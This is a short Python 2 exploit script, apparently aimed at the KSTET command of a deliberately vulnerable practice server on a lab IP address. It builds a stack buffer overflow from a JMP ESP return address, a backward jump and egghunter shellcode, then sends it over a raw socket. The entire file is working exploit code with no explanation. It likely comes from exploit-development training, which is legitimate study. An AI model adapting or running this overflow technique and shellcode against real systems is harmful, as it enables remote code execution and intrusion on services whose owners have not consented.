#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import os
import sys

offset = "\xAF\x11\x50\x62"   #JMP ESP 0x625011AF
stage1 = "\xeb\xc4"           #Jumb back 60 bytes
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" #32 bytes - search for W00TW00T
nops = "\x90" * 10 + "TOOWTOOW"

buffer = "KSTET "
buffer+= "\x41" * 10 + "\x90" *18 + egghunter + "\x90" * 10 + offset + stage1 + "\x41"* 30 
#625011AF   FFE4             JMP ESP

print "[*] Sending evil shenanigans - be patient"
print "[*] Sending " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.176', 9999))
#s.recv(1024)
s.send(buffer)
s.close()
